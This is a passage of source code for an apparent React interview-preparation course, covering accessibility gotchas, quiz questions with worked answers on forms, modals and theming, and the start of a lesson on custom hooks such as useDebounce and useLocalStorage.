        ["lead", "How would you make accessibility sustainable across several frontend teams?", `<p>Make the accessible path the easy path and automate checks. Concretely: a shared design system whose interactive primitives (dialog, menu, combobox, tabs, tooltip) are built on tested headless libraries (Radix, React Aria) and documented with keyboard behaviour; <code>eslint-plugin-jsx-a11y</code> in CI as errors; Testing Library's <code>getByRole</code> as the default query so inaccessible markup fails tests; axe checks in component tests and Playwright e2e for key flows; accessibility acceptance criteria and a keyboard check in the definition of done; periodic audits with real screen readers and, ideally, disabled users. One-off pre-launch audits regress within months; process and primitives don't.</p>`],
        ["architect", "Your design system is built on styled-components and the product is moving to Next.js App Router with Server Components. What are the options and trade-offs?", `<p>Runtime CSS-in-JS depends on React context and client-side style injection, so every styled component must be a client component, server-rendered styles need a style registry, and you pay runtime cost and bundle size; you lose much of RSC's benefit for presentational components. Options: (1) keep it and mark the design system <code>"use client"</code>, with a registry for SSR; quickest, but it caps the RSC payoff and depends on a library in maintenance mode. (2) Migrate incrementally to a zero-runtime approach (CSS Modules, Tailwind, or vanilla-extract/Panda/StyleX), starting with tokens as CSS variables so both systems share them, then leaf components, with a codemod where possible. (3) Big-bang rewrite: rarely justified. I'd choose (2): tokens first, coexisting systems, migrate the most-used primitives, measure bundle and INP before and after, and set a deprecation date. The wrong answer is assuming CSS-in-JS "just works" in Server Components.</p>`]
      ],
      gotchas: [
        `<b><code>&lt;dialog open&gt;</code> is not a modal.</b> The <code>open</code> attribute shows it non-modally: no backdrop, no inert background, no Escape. Call <code>showModal()</code> from an effect or event handler instead, and don't render <code>open</code> from React at the same time.`,
        `<b>React events bubble through portals by React tree, not DOM tree.</b> A click inside a portaled modal reaches the <code>onClick</code> of the component that rendered it, even if that is a clickable card or row.`,
        `<b><code>aria-hidden="true"</code> hides content from assistive tech but not from the keyboard.</b> Focusable elements inside an <code>aria-hidden</code> region become "ghost" focus stops. Use <code>inert</code> to remove both focus and interaction.`,
        `<b><code>outline: none</code> in a CSS reset</b> removes the focus indicator for everyone. Style <code>:focus-visible</code> instead so keyboard users always see where they are.`,
        `<b>Conditionally rendered error text inside an <code>aria-live</code> region</b> may not be announced: live regions must exist in the DOM <i>before</i> their content changes. Render the region always and change its text.`,
        `<b>Positive <code>tabIndex</code> values</b> (1, 2, …) create a separate tab order that runs before everything else and is almost impossible to maintain. Use DOM order, <code>0</code> and <code>-1</code> only.`,
        `<b>Tailwind can't see dynamic class names.</b> <code>"text-" + color + "-600"</code> is never generated; map variants to complete class strings.`,
        `<b><code>aria-invalid={false}</code> still renders an attribute</b>; harmless, but <code>undefined</code> keeps the DOM clean. Booleans on <code>aria-*</code> become the strings "true"/"false", unlike HTML boolean attributes such as <code>disabled</code>.`,
        `<b>Ref callbacks in React 19 can return a cleanup function.</b> An arrow ref like <code>ref={(el) =&gt; (refs.current[i] = el)}</code> returns the element, which TypeScript's React 19 types reject; use a block body.`
      ],
      best: [
        `Reach for the native element first (<code>button</code>, <code>a</code>, <code>label</code>, <code>fieldset</code>, <code>dialog</code>, <code>details</code>); add ARIA only to express state or patterns HTML lacks.`,
        `Define design tokens as CSS custom properties and switch themes with an attribute on <code>&lt;html&gt;</code>, not by re-rendering React.`,
        `Default to zero-runtime styling (CSS Modules or Tailwind); keep runtime CSS-in-JS out of new code, especially in Server Components apps.`,
        `Build forms from a shared <code>Field</code> component that wires <code>useId</code>, label, hint, error, <code>aria-describedby</code> and <code>aria-invalid</code> once.`,
        `Use a tested headless primitive (Radix, React Aria, or native <code>&lt;dialog&gt;</code>) for modals, menus, comboboxes and tooltips instead of hand-rolling focus traps.`,
        `Manage focus deliberately: into and back out of overlays, to the heading on route change, to the first error on failed submit.`,
        `Automate what you can (jsx-a11y lint, <code>getByRole</code> queries, axe in unit and e2e tests) and test what you can't with a keyboard and a screen reader.`,
        `Respect user preferences: <code>prefers-reduced-motion</code>, <code>prefers-color-scheme</code>, browser zoom to 200% without loss of content.`
      ],
      lab: [
        `Add <code>src/styles/tokens.css</code> from example 1 and a theme toggle button that sets <code>document.documentElement.dataset.theme</code>. Confirm with the React DevTools "Highlight updates" option that toggling the theme doesn't re-render your components.`,
        `Build <code>Button</code> with CSS Modules + <code>clsx</code> and a <code>TextField</code> with <code>useId</code>; use <code>TextField</code> in your Day 9 signup form with <code>register</code>. Check in the browser's accessibility panel (Chrome DevTools → Elements → Accessibility) that each input has a name and, after a failed submit, a description containing the error.`,
        `Find (or create) a clickable <code>&lt;div onClick&gt;</code> card and try to use it with only the keyboard. Replace it with a button or link and confirm Tab, Enter and Space all work.`,
        `Implement the native <code>&lt;dialog&gt;</code> modal and the portal modal. Test both with the keyboard only: focus moves in, Tab cycles inside, Escape closes, focus returns to the opener. Then add the route-focus effect to your root layout and navigate with the keyboard.`,
        `Install <code>eslint-plugin-jsx-a11y</code> and <code>axe-core</code>; add the axe test from example 9 for your signup form in its error state. Turn on a screen reader (NVDA or VoiceOver) and complete the signup flow without looking at the screen for one minute.`,
        `<b>Done when:</b> eslint reports no jsx-a11y errors, the axe test passes, every interactive element is reachable and operable by keyboard with a visible focus ring, the modal returns focus to its trigger, route changes announce the new page heading, and the theme switch changes colours without a React re-render.`
      ],
      teach: `<p>"Styling in React is really a build-time versus runtime question. Global CSS collides at scale; CSS Modules scope class names at build time; Tailwind generates utilities at build time; runtime CSS-in-JS like styled-components computes and injects styles while rendering, which costs CPU and only works in client components when you use Server Components. Whatever you choose, put design decisions in CSS custom properties, the design tokens, so a theme switch is one attribute on the html element and no React work at all. And use <code>clsx</code> to combine classes conditionally.</p>
<p>Accessibility in React is mostly HTML done right. A div with onClick looks like a button but keyboard users can't reach it and screen readers don't announce it; a real button does all of that for free. Every input gets a label, and in reusable components I connect labels, hints and errors with ids from <code>useId</code>. ARIA is for what HTML can't say, like <code>aria-expanded</code> or a tabs widget, and it only changes announcements, never behaviour.</p>
<p>The React-specific part is focus. A modal must move focus in, trap it, close on Escape and return focus to the button that opened it; I use native dialog with <code>showModal</code>, or a portal plus inert background, or a library like Radix or React Aria. After client-side navigation I move focus to the new page's heading. Then I verify with jsx-a11y lint, <code>getByRole</code> tests, axe, and a real screen reader."</p>`
    }
  ],
  quiz: [
    {
      q: `A product card is clickable with a mouse. A keyboard-only user reports they can't open any project. What is wrong, and what is the minimal correct fix?`,
      code: `function ProjectCard({ project, onOpen }: { project: { id: number; name: string }; onOpen: (id: number) => void }) {
  return (
    <div className="card" onClick={() => onOpen(project.id)}>
      <h3>{project.name}</h3>
    </div>
  );
}`,
      lang: "tsx",
      ans: `A <code>&lt;div&gt;</code> isn't focusable, has no role and ignores Enter/Space. Use a real <code>&lt;button type="button"&gt;</code> (or a <code>&lt;Link&gt;</code> if opening the project navigates).`,
      why: `Mouse users get the click, but the card never enters the Tab order, so keyboard users can't reach it and screen readers announce it as plain text. Adding <code>role="button"</code> alone changes only the announcement; you'd also need <code>tabIndex={0}</code> and handlers for Enter and Space, which re-implements a button badly. Put a <code>&lt;button&gt;</code> (or <code>&lt;Link to={"/projects/" + project.id}&gt;</code>, since opening a project is really navigation) inside the heading and, if the whole card must be clickable, stretch its hit area with CSS. <code>eslint-plugin-jsx-a11y</code> flags the original (<code>click-events-have-key-events</code>, <code>no-static-element-interactions</code>).`
    },
    {
      q: `A keyboard user opens this "Invite teammate" modal from a button halfway down the page, presses Escape, and then presses Tab. Focus jumps to the site logo at the top. What's missing?`,
      code: `function InviteModal({ onClose }: { onClose: () => void }) {
  const firstInput = useRef<HTMLInputElement>(null);
  useEffect(() => {
    firstInput.current?.focus();
    const onKey = (e: KeyboardEvent) => e.key === "Escape" && onClose();
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);
  return createPortal(
    <div role="dialog" aria-modal="true" aria-label="Invite teammate">
      <input ref={firstInput} placeholder="Email" />
      <button onClick={onClose}>Send invite</button>
    </div>,
    document.body,
  );
}`,
      lang: "tsx",
      ans: `Focus return. The modal never saves <code>document.activeElement</code> on open and never refocuses it on close; when the focused input unmounts, focus falls back to <code>&lt;body&gt;</code>, so the next Tab starts from the top.`,
      why: `On open, store the previously focused element; in the effect cleanup (or on close), call its <code>focus()</code>. Other gaps in the same component: no focus trap (Tab leaves the modal into the page behind, because nothing is inert), a placeholder used instead of a label, and the effect re-subscribes whenever <code>onClose</code> changes identity, which also re-runs <code>focus()</code>. The robust fix is native <code>&lt;dialog&gt;</code> with <code>showModal()</code> (inert background, Escape, top layer) plus explicit focus return, or a primitive like Radix Dialog / React Aria that handles all of it.`
    },
    {
      q: `The signup form validates with Zod on the client. When FastAPI rejects a request with 422 (e.g. the server's stricter name rule), the button re-enables but no error appears anywhere. Find the bug.`,
      code: `const onValid = async (values: SignupValues) => {
  const res = await fetch("/api/users", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(values) });
  if (res.status === 422) {
    const body = (await res.json()) as { detail: { loc: (string | number)[]; msg: string }[] };
    for (const err of body.detail) {
      setError(err.loc.join(".") as keyof SignupValues, { type: "server", message: err.msg });
    }
    return;
  }
  // ...
};`,
      lang: "tsx",
      ans: `<code>err.loc</code> is <code>["body","name"]</code>, so the code sets an error on <code>"body.name"</code>, a path no input renders. Drop the first segment (<code>loc.slice(1).join(".")</code>) and fall back to <code>root.server</code> for anything unmapped.`,
      why: `RHF happily stores errors under any path, and the cast to <code>keyof SignupValues</code> hid the mistake from TypeScript. FastAPI's <code>loc</code> starts with where the value came from (<code>body</code>, <code>query</code>, <code>path</code>); the rest matches RHF's dot paths, including array indexes (<code>lines.2.quantity</code>). After mapping, pass <code>{ shouldFocus: true }</code> for the first error so keyboard and screen-reader users land on it, and always render <code>errors.root?.server</code> so unknown locations are still visible. Also note the payload sends <code>confirm</code> to the API; send only the fields the Pydantic model expects.`
    },
    {
      q: `This React 19 form submits correctly, but the button never shows "Saving…". Why?`,
      code: `import { useActionState } from "react";
import { useFormStatus } from "react-dom";

export function RenameProject({ save }: { save: (prev: string, fd: FormData) => Promise<string> }) {
  const [message, formAction] = useActionState(save, "");
  const { pending } = useFormStatus();
  return (
    <form action={formAction}>
      <label htmlFor="pname">Name</label>
      <input id="pname" name="name" />
      <button type="submit" disabled={pending}>{pending ? "Saving…" : "Save"}</button>
      <p role="status">{message}</p>
    </form>
  );
}`,
      lang: "tsx",
      ans: `<code>useFormStatus</code> reports on the <b>parent</b> <code>&lt;form&gt;</code> of the component that calls it. Here it's called in the component that renders the form, so there's no parent form and <code>pending</code> is always <code>false</code>.`,
      why: `Move the button into a <code>SubmitButton</code> component rendered inside the form and call <code>useFormStatus()</code> there. Alternatively use the third value from <code>useActionState</code>: <code>const [message, formAction, isPending] = useActionState(save, "")</code>, which works in the same component. Both are React 19 APIs (<code>useActionState</code> from <code>react</code>, <code>useFormStatus</code> from <code>react-dom</code>).`
    },
    {
      q: `In an invoice form built with <code>useFieldArray</code>, the user types "Design", "Build", "Test" in three lines, then removes the first line. The screen now shows "Design" and "Build". What happened?`,
      code: `{fields.map((field, index) => (
  <div key={index}>
    <input {...register(\`lines.\${index}.description\`)} />
    <button type="button" onClick={() => remove(index)}>Remove</button>
  </div>
))}`,
      lang: "tsx",
      ans: `The rows are keyed by index. After removing index 0, keys 0 and 1 still exist, so React keeps the first two DOM rows (with their uncontrolled values "Design" and "Build") and removes the last one. Use <code>key={field.id}</code>.`,
      why: `RHF's inputs are uncontrolled, so the visible text lives in the DOM nodes. React matches list items by key: with index keys, removing the first item looks like "the last item disappeared". RHF's data is now <code>["Build","Test"]</code> but the screen shows "Design","Build", and per-row errors attach to the wrong row. <code>useFieldArray</code> generates a stable <code>id</code> per row precisely so React removes the right DOM nodes.`
    },
    {
      q: `A designer asks for dark mode. A teammate proposes a <code>ThemeContext</code> whose value is a full colour object, read by every styled component to compute its colours. You propose CSS custom properties. Which would you choose for a large app, and why?`,
      ans: `CSS custom properties: define tokens on <code>:root</code>, override them under <code>[data-theme="dark"]</code>, and toggle one attribute on <code>&lt;html&gt;</code>.`,
      why: `With context, changing the theme re-renders every consumer (potentially the whole app), and with runtime CSS-in-JS it also regenerates and re-injects styles; it also ties styling to client components in an RSC app. With CSS variables the browser recomputes styles natively, no React work happens, it works with CSS Modules, Tailwind (v4 <code>@theme</code>) and server-rendered HTML, and it can follow <code>prefers-color-scheme</code> without JavaScript. Keep a tiny piece of React state (or <code>localStorage</code>) only for the user's choice, and set the attribute before first paint to avoid a flash. Context is still fine for passing the <i>choice</i> to a toggle component.`
    }
  ]
},
/* ===== Day 10 ===== */
{
  n: 10,
  title: "Custom hooks and component patterns",
  goal: `<b>By the end of today</b> you can explain the rules of hooks in terms of how React stores hooks on a fiber, extract real logic into well-typed, tested custom hooks (<code>useDebounce</code>, <code>useLocalStorage</code>, <code>useOnlineStatus</code>, <code>useInterval</code>), and design reusable component APIs with compound components, controlled/uncontrolled props, headless hooks and error boundaries, knowing which older patterns (render props, HOCs) still earn their place.`,
  rev: [
    `<b>Rules of hooks:</b> call hooks only at the top level of a function component or a custom hook, never inside conditions, loops, nested functions or after an early return. React stores a component's hooks as an ordered linked list on its fiber and matches them <i>by call order</i>, not by name. <code>eslint-plugin-react-hooks</code> (<code>rules-of-hooks</code> + <code>exhaustive-deps</code>) enforces this; treat its errors as bugs. React 19's <code>use</code> is the one API that may be called conditionally.`,
    `<b>Custom hooks share logic, not state.</b> Each call to <code>useCounter()</code> creates its own hook slots on the calling component's fiber. To share state, lift it up, put it in context, or keep it in an external store read with <code>useSyncExternalStore</code>. Name hooks <code>useX</code> only if they call other hooks; return a tuple for one value + setter (<code>[value, setValue] as const</code>) and an object for anything larger.`,
    `<b>Hooks worth knowing by heart:</b> <code>useDebounce</code> (effect + <code>setTimeout</code> + cleanup), <code>useLocalStorage</code> (lazy initialiser, <code>typeof window</code> guard, <code>try/catch</code> around <code>JSON.parse</code>, <code>storage</code> event), <code>useOnlineStatus</code>/<code>useMediaQuery</code> (<code>useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot)</code>), <code>useInterval</code> (latest-callback ref so the timer is not reset each render). Test them with <code>renderHook</code> from <code>@testing-library/react</code>, wrapping time travel in <code>act</code>.`,
    `<b>Component API patterns:</b> composition over inheritance; compound components share state through context (<code>&lt;Tabs&gt;&lt;Tabs.List&gt;&lt;Tabs.Tab&gt;</code>); support both controlled (<code>value</code> + <code>onChange</code>) and uncontrolled (<code>defaultValue</code>) usage; headless hooks/components (Radix, React Aria, Headless UI, TanStack Table) give behaviour and accessibility without markup; slots are just props that take <code>ReactNode</code>. Render props and HOCs are mostly replaced by hooks but still appear in libraries.`,
    `<b>Error boundaries</b> are still class components (<code>static getDerivedStateFromError</code> + <code>componentDidCatch</code>) or the <code>react-error-boundary</code> package. They catch errors thrown while <i>rendering</i>, in lifecycle methods/effects and from <code>use(promise)</code> rejections in their subtree. They do <b>not</b> catch errors in event handlers, in async code (<code>setTimeout</code>, a <code>.then</code> you own), during SSR, or in the boundary itself; forward those with <code>showBoundary(error)</code> or handle them locally.`
  ],
  topics: [
    /* ------------------------------------------------------------------ */
    {
      id: "d10-custom-hooks",
      title: "Custom hooks and the rules of hooks",
      lv: ["fresher", "mid", "senior", "lead"],
      eli5: `<p>Imagine a cloakroom at a theatre. You hand over your coat, and instead of writing your name, the attendant just hangs it on the <b>next free hook</b> in a row: hook 1, hook 2, hook 3. When you come back, they hand you whatever is on hook 1, then hook 2, then hook 3, in the same order. It works perfectly, as long as you always hand things over in the same order.</p>
<p>React does exactly this with your component's state. The first <code>useState</code> you call gets slot 1, the second gets slot 2, and so on. React never asks "which <code>useState</code> is this?"; it only counts. If one day you skip a hook because of an <code>if</code>, everything after it shifts by one slot, and your "email" state suddenly gets the value that belonged to "password". That is why the <b>rules of hooks</b> say: always call hooks in the same order, at the top of your component.</p>
<p>A <b>custom hook</b> is like writing down a recipe: "take a coat, a hat and an umbrella, hang them in this order". You can give the recipe a name (<code>useRainGear</code>) and reuse it in many components. Each component that follows the recipe still gets its <i>own</i> hooks in the cloakroom. Sharing the recipe does not mean sharing the coats.</p>`,
      what: `<p>A <b>hook</b> is a function whose name starts with <code>use</code> that lets a component tap into React features: state (<code>useState</code>, <code>useReducer</code>), effects (<code>useEffect</code>, <code>useLayoutEffect</code>), context (<code>useContext</code>, <code>use</code>), refs, memoisation, transitions and external stores. A <b>custom hook</b> is simply your own function, also named <code>useSomething</code>, that calls one or more hooks. There is no registration and no special API: React does not even know a custom hook exists. At runtime it is an ordinary function call inside your component, so the hooks it calls are attributed to the calling component.</p>
<h5>The rules of hooks</h5>
<ul class="pts">
<li><b>Only call hooks at the top level.</b> Not inside <code>if</code>/<code>else</code>, loops, <code>switch</code>, <code>try/catch</code>, nested functions, event handlers, <code>useMemo</code>/<code>useEffect</code> callbacks, or after an early <code>return</code>. The number and order of hook calls must be identical on every render of a given component.</li>
<li><b>Only call hooks from React functions:</b> function components or other custom hooks. Not from plain utility functions, class components, or code that runs outside rendering (event handlers, timers, module scope).</li>
<li><b>Exception: <code>use</code> (React 19).</b> <code>use(promise)</code> and <code>use(context)</code> may be called inside conditions and loops, because they are not stored in the ordered hook list the same way. They still must be called during render of a component or hook, not in an event handler or <code>try/catch</code>.</li>
<li><b>Hooks must be pure during render.</b> The broader "rules of React" also say: components and hooks must be idempotent, must not mutate props/state, and must not read or write <code>ref.current</code> during render (except for lazy initialisation). The React Compiler (Day 11) relies on these rules.</li>
</ul>
<h5>Why order matters</h5>
<p>React stores a component's hook state on its <b>fiber</b> (the internal record for one component instance, Day 12) as a <b>linked list</b>, one node per hook call. On the first render each hook call appends a node; on every re-render React walks the same list from the start, handing the first hook call the first node, the second call the second node, and so on. Nothing ties a node to a variable name. Skip a call conditionally and every later hook reads the wrong node; React detects some of these cases and throws ("Rendered fewer hooks than expected", "Rendered more hooks than during the previous render") or warns that the order of hooks changed.</p>
<h5>The lint rule</h5>
<p><code>eslint-plugin-react-hooks</code> ships two classic rules: <code>react-hooks/rules-of-hooks</code> (an error: flags conditional calls, calls in loops, calls from non-hook functions, using the <code>use</code> prefix convention to decide what is a hook) and <code>react-hooks/exhaustive-deps</code> (a warning: checks that <code>useEffect</code>/<code>useMemo</code>/<code>useCallback</code> dependency arrays list every reactive value used inside). The Vite <code>react-ts</code> template already wires the plugin into <code>eslint.config.js</code>. Newer plugin versions also bundle additional rules derived from the React Compiler; the name of the recommended preset has changed between versions, so keep whatever the template generates rather than copying an old snippet.</p>
<h5>Extracting logic into a custom hook</h5>
<ul class="pts">
<li><b>When:</b> the same combination of state + effects appears in two places, or a component is hard to read because 40 lines of plumbing hide its intent. "<code>const isOnline = useOnlineStatus()</code>" says <i>what</i>, not <i>how</i>.</li>
<li><b>What goes in:</b> the hooks and logic; arguments become the hook's parameters; whatever the component needs comes back as the return value.</li>
<li><b>What stays out:</b> JSX. A hook that returns elements is usually a component in disguise.</li>
<li><b>Naming:</b> must start with <code>use</code> followed by a capital letter (<code>useDebounce</code>), so the linter and the Compiler treat it as a hook. Conversely, a function that calls no hooks should <i>not</i> start with <code>use</code>: make it a plain function so it can be called anywhere, including conditionally.</li>
<li><b>Return shapes:</b> a <b>tuple</b> (<code>[value, setValue] as const</code>) when there are one or two values and callers will rename them (like <code>useState</code>); an <b>object</b> (<code>{ data, error, isPending }</code>) when there are more, when callers pick a subset, or when you may add fields later without breaking positional destructuring.</li>
</ul>
<h5>Each call has its own state</h5>
<p>Two components calling <code>useCounter()</code> get two independent counters. Two calls in the <i>same</i> component also get two independent counters. Custom hooks reuse <b>stateful logic</b>; they never share <b>state</b>. To share state between components you still lift it up (Day 4), use context (Day 6), or keep it outside React in a store and subscribe with <code>useSyncExternalStore</code> (which is how Zustand and Redux bindings work).</p>
<h5>A toolbox of hooks you should be able to write from memory</h5>
<ul class="pts">
<li><code>useDebounce(value, delay)</code>: returns <code>value</code> only after it has stopped changing for <code>delay</code> ms. Built from <code>useState</code> + <code>useEffect</code> + <code>setTimeout</code> + cleanup.</li>
<li><code>useLocalStorage(key, initial)</code>: <code>useState</code>-like, persisted to <code>localStorage</code>. Needs a lazy initialiser, an SSR guard (<code>typeof window === 'undefined'</code>), <code>try/catch</code> around <code>JSON.parse</code> and around writes (quota, private mode), and optionally cross-tab sync via the <code>storage</code> event.</li>
<li><code>useOnlineStatus()</code> and <code>useMediaQuery(query)</code>: read browser state that changes outside React. The correct tool is <code>useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot)</code>, not <code>useState</code> + <code>useEffect</code>.</li>
<li><code>useInterval(callback, delay)</code>: a declarative <code>setInterval</code>. Stores the latest callback in a ref so the interval is not torn down and recreated every render, while still calling fresh code (no stale closure).</li>
</ul>
<h5>Typing generic hooks</h5>
<p>Write hooks as <code>function</code> declarations with a type parameter: <code>function useLocalStorage&lt;T&gt;(key: string, initial: T)</code>. TypeScript infers <code>T</code> from the argument, so <code>useLocalStorage('theme', 'light')</code> gives <code>string</code>, while <code>useLocalStorage&lt;'light' | 'dark'&gt;('theme', 'light')</code> narrows it. Return tuples with <code>as const</code> (or an explicit return type) or TypeScript widens them to an array of a union. In a <code>.tsx</code> file a generic <i>arrow</i> function needs <code>&lt;T,&gt;</code> to avoid being parsed as JSX, one more reason to prefer <code>function</code>.</p>
<h5>Testing hooks</h5>
<p><code>renderHook</code> from <code>@testing-library/react</code> renders a tiny test component that calls your hook and exposes the latest return value as <code>result.current</code>. <code>rerender(newProps)</code> re-runs it with new arguments, <code>unmount()</code> runs cleanups, and state updates triggered from the test must be wrapped in <code>act()</code>. The old <code>@testing-library/react-hooks</code> package is deprecated for React 18+. Often the better test is through a real component that uses the hook (Day 14).</p>`,
      why: `<p>Before hooks (React 16.8), reusable stateful logic in React had no good home. Function components could not hold state; class components could, but their logic was split across lifecycle methods: subscribe in <code>componentDidMount</code>, re-subscribe in <code>componentDidUpdate</code> if a prop changed, unsubscribe in <code>componentWillUnmount</code>. To reuse that logic you wrapped components in <b>higher-order components</b> (<code>withWindowSize(withAuth(withRouter(Page)))</code>) or <b>render props</b> (<code>&lt;Mouse render={pos =&gt; ...} /&gt;</code>). Both worked, but produced "wrapper hell" in DevTools, prop-name collisions between HOCs, indirection that TypeScript struggled to type, and logic that was hard to follow because it lived in three places.</p>
<p>Hooks fixed this by making stateful logic composable with plain function calls. A custom hook is a function that calls hooks, so it can call other custom hooks, take arguments, and return whatever it likes, with no extra component layers. The price is the rules of hooks: because React identifies each hook by its position in the call sequence (a deliberate design choice that avoids needing unique keys for every <code>useState</code>), the sequence must be stable. The React team chose call order over explicit keys because it makes hooks composable: two custom hooks can each call <code>useState</code> internally without their names colliding, which a key-based design would have made fragile.</p>
<p>Without custom hooks, a real app ends up with the same <code>useEffect</code> + <code>addEventListener</code> + cleanup + SSR guard copy-pasted across a dozen components, each with its own subtle bug (one forgot cleanup, one has a stale closure, one crashes on the server). A custom hook fixes the bug once, gets a test once, and documents intent at every call site.</p>`,
      diagram: {
        html: lanes([
          ["Render 1 (mount)", ["useState('') → creates hook #1 (query)", "useDebounce(query) → useState → hook #2", "↳ useEffect → hook #3 (timer)", "useLocalStorage('theme') → useState → hook #4", "↳ useEffect → hook #5 (storage listener)"]],
          ["Fiber.memoizedState (linked list)", ["#1 { memoizedState: '' }", "#2 { memoizedState: '' }", "#3 { effect: deps [query, 300] }", "#4 { memoizedState: 'dark' }", "#5 { effect: deps ['theme'] }"]],
          ["Render 2 (update)", ["call 1 reads #1 → 're'", "call 2 reads #2 → ''", "call 3 reads #3 → compare deps, re-run", "call 4 reads #4 → 'dark'", "call 5 reads #5 → deps equal, skip"]]
        ]) + flow([["if (x) useState()", "skips a slot", "r"], ["every later call", "reads the wrong node", "r"], ["React throws or warns", "\"Rendered fewer hooks…\"", "w"]]),
        steps: [
          `On mount, every hook call (including the ones hidden inside custom hooks) appends a node to a linked list stored on the component's fiber. Custom hooks add no layer of their own; their inner hooks are simply nodes #2, #3 and so on.`,
          `On update, React walks that list from the head. The <i>n</i>th hook call receives the <i>n</i>th node. Names, variable names and which custom hook made the call are irrelevant.`,
          `<code>useState</code> nodes hold the current value and an update queue; effect nodes hold the previous deps so React can compare with <code>Object.is</code> and decide whether to re-run.`,
          `If a call is skipped or added conditionally, the list and the calls go out of step. React throws when the count differs ("Rendered more/fewer hooks…") and, in development, warns when the <i>kind</i> of hook at a position changes. If the count and kinds happen to match, you get silent wrong state, which is why the linter, not runtime checks, is your real defence.`
        ]
      },
      ex: [
        {
          t: "1. Breaking the rules of hooks, and the fix",
          lang: "tsx",
          code: `import { useState } from 'react';

type Props = { user: { name: string } | null };

// BUG: the early return means useState is skipped when user is null.
// First render with user=null: 0 hooks. Next render with a user: 1 hook.
export function GreetingBroken({ user }: Props) {
  if (!user) return <p>Please log in</p>;
  const [greeting, setGreeting] = useState('Hello'); // eslint: React Hook "useState" is called conditionally
  return <button onClick={() => setGreeting('Hi')}>{greeting}, {user.name}</button>;
}

// FIX 1: call every hook first, branch afterwards.
export function Greeting({ user }: Props) {
  const [greeting, setGreeting] = useState('Hello');
  if (!user) return <p>Please log in</p>;
  return <button onClick={() => setGreeting('Hi')}>{greeting}, {user.name}</button>;
}

// FIX 2 (often cleaner): split into two components. The child always calls its hooks.
export function GreetingGate({ user }: Props) {
  return user ? <LoggedInGreeting name={user.name} /> : <p>Please log in</p>;
}
function LoggedInGreeting({ name }: { name: string }) {
  const [greeting, setGreeting] = useState('Hello');
  return <button onClick={() => setGreeting('Hi')}>{greeting}, {name}</button>;
}`,
          out: `GreetingBroken: renders "Please log in", then when user arrives React throws:
  "Rendered more hooks than during the previous render."
ESLint (react-hooks/rules-of-hooks) flags it before you ever run it:
  React Hook "useState" is called conditionally. React Hooks must be called in the exact same order in every component render.`,
          note: `<p>Fix 2 is usually better design: the conditional decides <i>which component</i> renders, and each component has a fixed hook sequence. A different component type at that position also means React gives it fresh state when it mounts, which is often exactly what you want after login.</p>`
        },
        {
          t: "2. useDebounce: the classic extraction, generic and typed",
          lang: "tsx",
          code: `// src/hooks/useDebounce.ts
import { useEffect, useState } from 'react';

/** Returns \`value\` once it has stopped changing for \`delayMs\`. */
export function useDebounce<T>(value: T, delayMs = 300): T {
  const [debounced, setDebounced] = useState(value);

  useEffect(() => {
    const id = setTimeout(() => setDebounced(value), delayMs);
    return () => clearTimeout(id); // a new keystroke cancels the pending update
  }, [value, delayMs]);

  return debounced;
}

// src/features/users/UserSearch.tsx
import { useState } from 'react';
import { keepPreviousData, useQuery } from '@tanstack/react-query';
import { useDebounce } from '../../hooks/useDebounce';

type User = { id: number; name: string };

async function searchUsers(q: string, signal: AbortSignal): Promise<User[]> {
  const params = new URLSearchParams({ q });
  const res = await fetch('/api/users?' + params.toString(), { signal });
  if (!res.ok) throw new Error('Search failed: ' + res.status);
  return res.json();
}

export function UserSearch() {
  const [query, setQuery] = useState('');
  const debouncedQuery = useDebounce(query.trim(), 300);

  const { data = [], isFetching } = useQuery({
    queryKey: ['users', 'search', debouncedQuery],
    queryFn: ({ signal }) => searchUsers(debouncedQuery, signal),
    enabled: debouncedQuery.length >= 2,
    placeholderData: keepPreviousData,
  });

  return (
    <div>
      <input value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Search users" />
      {isFetching && <small> searching…</small>}
      <ul>{data.map((u) => <li key={u.id}>{u.name}</li>)}</ul>
    </div>
  );
}`,
          out: `Typing "srini" quickly: the input updates on every keystroke (query is urgent state),
but debouncedQuery changes once, 300 ms after the last key, so FastAPI receives ONE request:
  GET /api/users?q=srini`,
          note: `<p>Note the split: <code>query</code> drives the input (must update instantly), <code>debouncedQuery</code> drives the network. The effect cleanup is the whole trick: each new <code>value</code> cancels the previous timer. Because the hook is generic, <code>useDebounce(filters, 500)</code> works on objects too, but then the caller must keep <code>filters</code> referentially stable or the timer restarts every render. (Requires <code>npm install @tanstack/react-query</code>; Day 7 covers TanStack Query.)</p>`
        },
        {
          t: "3. useLocalStorage: lazy init, SSR safety, JSON errors, cross-tab sync",
          lang: "tsx",
          code: `// src/hooks/useLocalStorage.ts
import { useCallback, useEffect, useState } from 'react';

type SetValue<T> = (next: T | ((prev: T) => T)) => void;

function readStorage<T>(key: string, fallback: T): T {
  if (typeof window === 'undefined') return fallback; // SSR / tests without DOM
  try {
    const raw = window.localStorage.getItem(key);
    return raw === null ? fallback : (JSON.parse(raw) as T);
  } catch {
    // Corrupt JSON, or storage blocked (some privacy modes throw on access)
    return fallback;
  }
}

export function useLocalStorage<T>(key: string, initialValue: T): readonly [T, SetValue<T>] {
  // Lazy initialiser: read storage once on mount, not on every render.
  const [value, setValue] = useState<T>(() => readStorage(key, initialValue));

  // Persist whenever the value changes.
  useEffect(() => {
    try {
      window.localStorage.setItem(key, JSON.stringify(value));
    } catch {
      // QuotaExceededError or blocked storage: keep working in memory.
    }
  }, [key, value]);

  // Sync other tabs: the 'storage' event fires in OTHER documents, not the one that wrote.
  useEffect(() => {
    function onStorage(e: StorageEvent) {
      if (e.storageArea !== window.localStorage || e.key !== key) return;
      setValue(e.newValue === null ? initialValue : safeParse(e.newValue, initialValue));
    }
    window.addEventListener('storage', onStorage);
    return () => window.removeEventListener('storage', onStorage);
    // initialValue intentionally omitted: callers often pass a new object literal each render.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [key]);

  const set = useCallback<SetValue<T>>((next) => {
    setValue((prev) => (typeof next === 'function' ? (next as (p: T) => T)(prev) : next));
  }, []);

  return [value, set] as const;
}

function safeParse<T>(raw: string, fallback: T): T {
  try { return JSON.parse(raw) as T; } catch { return fallback; }
}

// Usage
// const [theme, setTheme] = useLocalStorage<'light' | 'dark'>('theme', 'light');
// setTheme((t) => (t === 'light' ? 'dark' : 'light'));`,
